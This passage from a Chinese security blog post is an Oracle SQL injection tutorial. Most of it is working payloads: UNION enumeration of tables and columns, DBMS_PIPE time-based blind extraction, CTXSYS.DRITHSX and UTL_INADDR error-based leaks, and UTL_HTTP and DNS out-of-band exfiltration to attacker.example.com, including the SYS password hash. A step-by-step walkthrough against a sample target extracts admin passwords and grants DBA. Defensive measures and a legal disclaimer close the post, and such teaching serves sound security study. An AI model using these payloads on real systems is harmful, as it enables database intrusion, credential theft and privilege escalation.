+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL,(SELECT table_name FROM all_tables WHERE ROWNUM=1) FROM DUAL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 批量拼接（LISTAGG, 11g+）</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,(<span class="keyword">SELECT</span> <span class="built_in">LISTAGG</span>(table_name,<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">  <span class="keyword">WITHIN</span> <span class="keyword">GROUP</span> (<span class="keyword">ORDER</span> <span class="keyword">BY</span> table_name)</span><br><span class="line">  <span class="keyword">FROM</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span><span class="string">&#x27;WEBAPP&#x27;</span>) <span class="keyword">FROM</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>枚举列名与提取数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL,(SELECT LISTAGG(column_name,&#x27;</span>, <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  WITHIN GROUP (ORDER BY column_id)</span></span><br><span class="line"><span class="string">  FROM all_tab_columns WHERE table_name=&#x27;</span>USERS<span class="string">&#x27; AND owner=&#x27;</span>WEBAPP<span class="string">&#x27;) FROM DUAL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,(<span class="keyword">SELECT</span> username<span class="operator">||</span><span class="string">&#x27;:&#x27;</span><span class="operator">||</span>password</span><br><span class="line">  <span class="keyword">FROM</span> webapp.users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="keyword">FROM</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串函数对照"><a href="#字符串函数对照" class="headerlink" title="字符串函数对照"></a>字符串函数对照</h3><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>MySQL</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单列拼接</td>
+<td><code>GROUP_CONCAT(col)</code></td>
+<td><code>LISTAGG(col,&#39;,&#39;) WITHIN GROUP (ORDER BY ...)</code></td>
+</tr>
+<tr>
+<td>多列连接</td>
+<td><code>CONCAT(a,b)</code></td>
+<td><code>||</code> 运算符</td>
+</tr>
+<tr>
+<td>换行</td>
+<td><code>CHAR(10)</code></td>
+<td><code>CHR(10)</code></td>
+</tr>
+</tbody></table>
+<h2 id="时间盲注（DBMS-PIPE）"><a href="#时间盲注（DBMS-PIPE）" class="headerlink" title="时间盲注（DBMS_PIPE）"></a>时间盲注（DBMS_PIPE）</h2><p>Oracle 无 <code>SLEEP()</code>，用 <code>DBMS_PIPE.RECEIVE_MESSAGE</code> — 默认对 PUBLIC 可执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 延迟 5 秒</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE((&#x27;</span>a<span class="string">&#x27;),5) FROM DUAL) IS NOT NULL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 条件盲注：若当前用户为 ADMIN 则延迟</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users</span><br><span class="line">  <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">THEN</span> DBMS_PIPE.RECEIVE_MESSAGE((<span class="string">&#x27;x&#x27;</span>),<span class="number">3</span>)</span><br><span class="line">  <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 逐字符盲注</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN SUBSTR(</span></span><br><span class="line"><span class="string">  (SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1)=&#x27;</span>U<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  THEN DBMS_PIPE.RECEIVE_MESSAGE((&#x27;</span>x<span class="string">&#x27;),3)</span></span><br><span class="line"><span class="string">  ELSE NULL END FROM DUAL) IS NULL--</span></span><br></pre></td></tr></table></figure>
+
+<p>若 <code>DBMS_LOCK</code> 已被授权：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL) IS NULL--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="基于错误消息的注入"><a href="#基于错误消息的注入" class="headerlink" title="基于错误消息的注入"></a>基于错误消息的注入</h2><h3 id="CTXSYS-DRITHSX"><a href="#CTXSYS-DRITHSX" class="headerlink" title="CTXSYS.DRITHSX"></a>CTXSYS.DRITHSX</h3><p>Oracle Text 组件的 <code>DRITHSX.SN</code> 将用户输入嵌入错误消息，是 Oracle 错误注入最经典的技巧：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 错误输出: ORA-20111: Error in DRITHSX.SN: ADMIN</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CTXSYS.DRITHSX.SN(1,</span></span><br><span class="line"><span class="string">  (SELECT USER FROM DUAL)) FROM DUAL) IS NULL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 嵌套提取表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>)) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>依赖：Oracle Text 已安装且 <code>CTXSYS</code> 未锁定。12c+ 中 CTXSYS 默认锁定。</p>
+</blockquote>
+<h3 id="UTL-INADDR-与-DBMS-XMLQUERY-替代"><a href="#UTL-INADDR-与-DBMS-XMLQUERY-替代" class="headerlink" title="UTL_INADDR 与 DBMS_XMLQUERY 替代"></a>UTL_INADDR 与 DBMS_XMLQUERY 替代</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- UTL_INADDR DNS 解析错误回显 → ORA-29257: host ADMIN unknown</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT UTL_INADDR.GET_HOST_NAME(</span></span><br><span class="line"><span class="string">  (SELECT USER FROM DUAL)) FROM DUAL) IS NULL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- DBMS_XMLQUERY 错误回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> DBMS_XMLQUERY.GETXML(</span><br><span class="line">  <span class="string">&#x27;SELECT * FROM nonexistent_&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span> <span class="keyword">FROM</span> DUAL)</span><br><span class="line">) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="带外通道（Out-of-Band）"><a href="#带外通道（Out-of-Band）" class="headerlink" title="带外通道（Out-of-Band）"></a>带外通道（Out-of-Band）</h2><h3 id="UTL-HTTP-发起-HTTP-请求"><a href="#UTL-HTTP-发起-HTTP-请求" class="headerlink" title="UTL_HTTP 发起 HTTP 请求"></a>UTL_HTTP 发起 HTTP 请求</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基本带外</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT UTL_HTTP.REQUEST(</span></span><br><span class="line"><span class="string">  &#x27;</span>http:<span class="operator">/</span><span class="operator">/</span>attacker.example.com<span class="operator">/</span>exfil?data<span class="operator">=</span><span class="string">&#x27;||(SELECT USER FROM DUAL)</span></span><br><span class="line"><span class="string">) FROM DUAL) IS NULL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 读取密码哈希（需 DBA 访问 sys.user$）</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> UTL_HTTP.REQUEST(</span><br><span class="line">  <span class="string">&#x27;http://attacker.example.com/exfil?pwd=&#x27;</span><span class="operator">||</span></span><br><span class="line">  (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> sys.user$ <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;SYS&#x27;</span> <span class="keyword">AND</span> ROWNUM<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="UTL-INADDR-DNS-带外与条件盲注"><a href="#UTL-INADDR-DNS-带外与条件盲注" class="headerlink" title="UTL_INADDR DNS 带外与条件盲注"></a>UTL_INADDR DNS 带外与条件盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- DNS 带外</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(</span></span><br><span class="line"><span class="string">  (SELECT USER FROM DUAL)||&#x27;</span>.attacker.example.com<span class="string">&#x27;</span></span><br><span class="line"><span class="string">) FROM DUAL) IS NULL--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- OOB 条件盲注：仅当密码首字符为 &#x27;</span>a<span class="string">&#x27; 时触发回连</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(</span><br><span class="line">  (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> webapp.users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line">  <span class="keyword">THEN</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://attacker.example.com/found&#x27;</span>)</span><br><span class="line">  <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="DBMS-XMLQUERY-高级利用"><a href="#DBMS-XMLQUERY-高级利用" class="headerlink" title="DBMS_XMLQUERY 高级利用"></a>DBMS_XMLQUERY 高级利用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 执行任意 SELECT 并以 XML 返回</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT LENGTH(DBMS_XMLQUERY.GETXML(</span></span><br><span class="line"><span class="string">  &#x27;</span><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> dba_users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">)) FROM DUAL) &gt; 0--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="注入策略决策流程图"><a href="#注入策略决策流程图" class="headerlink" title="注入策略决策流程图"></a>注入策略决策流程图</h2><pre class="mermaid">flowchart TD
+    A[发现注入点] --> B{有回显?}
+    B -->|是| C[UNION SELECT + DUAL]
+    B -->|否| D{是否报错?}
+    D -->|是| E{CTXSYS 可用?}
+    E -->|是| F[CTXSYS.DRITHSX error-based]
+    E -->|否| G[UTL_INADDR / DBMS_XMLQUERY]
+    D -->|否| H{能否出网?}
+    H -->|是| I[UTL_HTTP / DNS OOB]
+    H -->|否| J[DBMS_PIPE 时间盲注]
+    C --> K[枚举 all_tables → all_tab_columns → 提取数据]
+    F --> K
+    G --> K
+    I --> K
+    J --> K</pre>
+
+<h2 id="完整实战：盲注逐步攻破-Oracle"><a href="#完整实战：盲注逐步攻破-Oracle" class="headerlink" title="完整实战：盲注逐步攻破 Oracle"></a>完整实战：盲注逐步攻破 Oracle</h2><p><strong>目标</strong>：<code>https://victim.example.com/product?id=101</code>，无回显、无报错、Oracle 11g。</p>
+<p><strong>Step 1 — 确认注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=101&#x27; AND &#x27;1&#x27;=&#x27;1&#x27;--     → 正常</span><br><span class="line">?id=101&#x27; AND &#x27;1&#x27;=&#x27;2&#x27;--     → 异常，确认布尔盲注</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2 — DBMS_PIPE 逐字节提取表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">101</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTR(</span></span><br><span class="line"><span class="string">  (SELECT table_name FROM all_tables WHERE owner=&#x27;</span>WEBAPP<span class="string">&#x27; AND ROWNUM=1),1,1))=85</span></span><br><span class="line"><span class="string">  THEN DBMS_PIPE.RECEIVE_MESSAGE((&#x27;</span>x<span class="string">&#x27;),2)</span></span><br><span class="line"><span class="string">  ELSE NULL END FROM DUAL) IS NULL--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3</strong> — 同理枚举 <code>all_tab_columns</code> 获取列名。</p>
+<p><strong>Step 4 — 提取凭据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">101</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTR(</span></span><br><span class="line"><span class="string">  (SELECT password FROM webapp.admins WHERE ROWNUM=1),1,1))&gt;64</span></span><br><span class="line"><span class="string">  THEN DBMS_PIPE.RECEIVE_MESSAGE((&#x27;</span>x<span class="string">&#x27;),2)</span></span><br><span class="line"><span class="string">  ELSE NULL END FROM DUAL) IS NULL--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 5</strong> — 若有堆叠注入且 DBA 权限，尝试提权：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">101</span><span class="string">&#x27;; GRANT DBA TO WEBAPP;--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常见陷阱"><a href="#常见陷阱" class="headerlink" title="常见陷阱"></a>常见陷阱</h2><table>
+<thead>
+<tr>
+<th>陷阱</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>忘记 DUAL</td>
+<td>Oracle SELECT 必须有 FROM</td>
+</tr>
+<tr>
+<td>UNION 类型不匹配</td>
+<td>用 NULL 做安全占位符</td>
+</tr>
+<tr>
+<td><code>||</code> 在 URL 中被截断</td>
+<td>改用 CONCAT 或 URL 编码</td>
+</tr>
+<tr>
+<td>ROWNUM 子查询行为异常</td>
+<td>子查询中排序失效，12c+ 用 FETCH FIRST</td>
+</tr>
+<tr>
+<td>12c+ CTXSYS 锁定</td>
+<td>CTXSYS 默认锁定，老 payload 直接失效</td>
+</tr>
+<tr>
+<td>PL&#x2F;SQL 需分号</td>
+<td>堆叠注入需分号但多数注入点不支持</td>
+</tr>
+</tbody></table>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="绑定变量（根本解法）"><a href="#绑定变量（根本解法）" class="headerlink" title="绑定变量（根本解法）"></a>绑定变量（根本解法）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM products WHERE id = ?&quot;</span>);</span><br><span class="line">ps.setInt(<span class="number">1</span>, userInputId);</span><br></pre></td></tr></table></figure>
+
+<h3 id="撤销高风险包权限"><a href="#撤销高风险包权限" class="headerlink" title="撤销高风险包权限"></a>撤销高风险包权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_HTTP   <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_TCP    <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_SMTP   <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_FILE   <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> DBMS_PIPE  <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> CTXSYS.DRITHSX <span class="keyword">FROM</span> PUBLIC;</span><br></pre></td></tr></table></figure>
+
+<h3 id="锁定账户与审计"><a href="#锁定账户与审计" class="headerlink" title="锁定账户与审计"></a>锁定账户与审计</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> CTXSYS ACCOUNT LOCK;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> MDSYS ACCOUNT LOCK;</span><br><span class="line">AUDIT <span class="keyword">SELECT</span> <span class="keyword">ON</span> webapp.admins <span class="keyword">BY</span> ACCESS;</span><br><span class="line">AUDIT <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_HTTP <span class="keyword">BY</span> ACCESS;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Oracle SQL 注入的核心特征：<code>DUAL</code> 表是语法基础、<code>DBMS_PIPE</code> 提供稳定盲注通道、<code>UTL_HTTP</code> 打开带外大门、<code>CTXSYS.DRITHSX</code> 是经典错误回显手法。防御应聚焦于<strong>绑定变量</strong>这一根本解法和<strong>包权限控制</strong>这一纵深防线。</p>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文仅供安全研究与教育目的使用。未经授权对非自有系统进行 SQL 注入测试属于违法行为。作者及发布平台不对读者基于本文内容实施的任何未授权行为承担责任。在实际项目中请遵守《网络安全法》等相关法律法规，在获得明确书面授权后方可进行渗透测试。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/11/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
